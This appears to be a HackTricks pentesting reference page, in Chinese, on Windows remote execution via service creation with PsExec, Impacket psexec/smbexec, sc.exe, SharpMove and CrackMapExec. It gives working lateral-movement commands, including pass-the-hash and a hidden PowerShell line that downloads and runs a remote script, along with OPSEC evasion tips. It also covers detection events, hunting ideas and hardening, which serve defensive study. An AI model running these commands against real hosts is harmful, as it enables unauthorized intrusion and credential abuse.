# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## 它们如何工作

这些 techniques 通过 SMB/RPC 远程滥用 Windows Service Control Manager (SCM)，在目标主机上执行 commands。常见流程如下：

1. Authenticate 到目标，并通过 SMB (TCP/445) 访问 ADMIN$ share。
2. Copy 一个 executable，或指定由 service 运行的 LOLBAS command line。
3. 通过 SCM (MS-SCMR over \PIPE\svcctl) 远程创建 service，使其指向该 command 或 binary。
4. Start service 以执行 payload，并可选地通过 named pipe 捕获 stdin/stdout。
5. Stop service 并清理（delete service 以及所有 dropped binaries）。

Requirements/prereqs:
- 目标上的 Local Administrator (SeCreateServicePrivilege)，或目标上明确的 service creation 权限。
- SMB (445) 可访问且 ADMIN$ share 可用；host firewall 允许 Remote Service Management。
- UAC Remote Restrictions：对于 local accounts，token filtering 可能会阻止通过 network 使用 admin 权限，除非使用内置 Administrator 或设置 LocalAccountTokenFilterPolicy=1。
- Kerberos vs NTLM：使用 hostname/FQDN 可启用 Kerberos；通过 IP 连接通常会回退到 NTLM（在 hardened environments 中可能被阻止）。

### 通过 sc.exe 手动执行 ScExec/WinExec

以下展示了一种最小化的 service-creation 方法。service image 可以是 dropped EXE，也可以是 cmd.exe 或 powershell.exe 等 LOLBAS。
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
说明：
- 启动非 service EXE 时可能会出现 timeout error；但执行仍会发生。
- 为了更加 OPSEC-friendly，优先使用 fileless commands（cmd /c、powershell -enc），或删除 dropped artifacts。

更多详细步骤请参阅： https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Tooling and examples

### Sysinternals PsExec.exe

- 经典的 admin tool，使用 SMB 将 PSEXESVC.exe 写入 ADMIN$，安装临时 service（默认名称为 PSEXESVC），并通过 named pipes 代理 I/O。
- 使用示例：<sup>[[1]](#references)</sup>
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- 你可以通过 WebDAV 直接从 Sysinternals Live 启动：
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- 会留下 service install/uninstall events（除非使用 `-r`，否则 service name 通常为 PSEXESVC），并会在执行期间创建 `C:\Windows\PSEXESVC.exe`。

### Impacket psexec.py（PsExec-like）

- 使用内置的 RemCom-like service。通过 ADMIN$ 投放临时 service binary（通常使用随机名称），创建 service（默认通常为 RemComSvc），并通过 named pipe 代理 I/O。
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artifacts
- C:\Windows\ 中的临时 EXE（随机 8 个字符）。除非另行指定，否则 Service name 默认为 RemComSvc。

### Impacket smbexec.py (SMBExec)

- 创建一个临时 Service，用于启动 cmd.exe，并使用 named pipe 进行 I/O。通常不会写入完整的 EXE payload；command execution 为半交互式。
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral 和 SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral)（C#）实现了多种 lateral movement 方法，包括基于 service 的 exec。
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) 包含修改/创建服务以远程执行命令的功能。
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- 你也可以使用 CrackMapExec 通过不同的 backends（psexec/smbexec/wmiexec）执行：
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC、检测与痕迹

使用类似 PsExec 的技术时，典型的主机/网络痕迹包括：
- 在目标主机上，针对所使用的 admin 账户生成 Security 4624（Logon Type 3）和 4672（Special Privileges）事件。
- Security 5140/5145 File Share 和 File Share Detailed 事件，显示对 ADMIN$ 的访问，以及服务二进制文件的创建/写入（例如 PSEXESVC.exe 或随机的 8 字符 .exe）。
- 目标主机上的 Security 7045 Service Install：服务名称可能为 PSEXESVC、RemComSvc 或自定义名称（-r / -service-name）。
- Sysmon 1（Process Create）记录 services.exe 或服务映像的创建，3（Network Connect）记录网络连接，11（File Create）记录 C:\Windows\ 中的文件创建，17/18（Pipe Created/Connected）记录类似 \\.\pipe\psexesvc、\\.\pipe\remcom_* 或随机等效名称的管道。
- Sysinternals EULA 的 Registry 痕迹：操作员主机上的 HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1（如果未禁用）。

## Hunting 思路
- 对 ImagePath 包含 cmd.exe /c、powershell.exe 或 TEMP 路径的服务安装发出告警。
- 查找 ParentImage 为 C:\Windows\PSEXESVC.exe 的进程创建事件，或查找 services.exe 的子进程中以 LOCAL SYSTEM 身份运行 shell 的进程。
- 标记以 -stdin/-stdout/-stderr 结尾的 named pipes，或已知的 PsExec clone 管道名称。

## 常见故障排查
- 创建服务时出现 Access is denied (5)：通常是因为并非真正的 local admin、local accounts 受到 UAC remote restrictions 限制，或 EDR 对服务二进制文件路径启用了 tampering protection。
- 出现 The network path was not found (53)，或无法连接到 ADMIN$：可能是 firewall 阻止 SMB/RPC，或禁用了 admin shares。
- Kerberos 失败但 NTLM 被阻止：使用 hostname/FQDN（而不是 IP）进行连接，确保 SPN 正确；使用 Impacket 时，可通过票据提供 -k/-no-pass。
- 服务启动超时但 payload 已执行：如果文件并非真正的服务二进制文件，这是预期现象；可将输出捕获到文件，或使用 smbexec 获取实时 I/O。

## Hardening 注意事项
- Windows 11 24H2 和 Windows Server 2025 默认要求 outbound（以及 Windows 11 的 inbound）连接使用 SMB signing。使用有效凭据的合法 PsExec 不会因此失效，但可防止 unsigned SMB relay abuse，并可能影响不支持 signing 的设备。<sup>[[2]](#references)</sup>
- 新增的 SMB client NTLM blocking（Windows 11 24H2/Server 2025）可能会阻止连接到 IP 或非 Kerberos 服务器时的 NTLM fallback。在 hardened environments 中，这将导致基于 NTLM 的 PsExec/SMBExec 失效；请使用 Kerberos（hostname/FQDN），或在确有合法需求时配置 exceptions。<sup>[[2]](#references)</sup>
- Principle of least privilege：减少 local admin 成员数量，优先采用 Just-in-Time/Just-Enough Admin，强制使用 LAPS，并监控/告警 7045 service installs。

## 另请参阅

- 基于 WMI 的 remote exec（通常更 fileless）：

{{#ref}}
./wmiexec.md
{{#endref}}

- 基于 WinRM 的 remote exec：

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

{{#include ../../banners/hacktricks-training.md}}
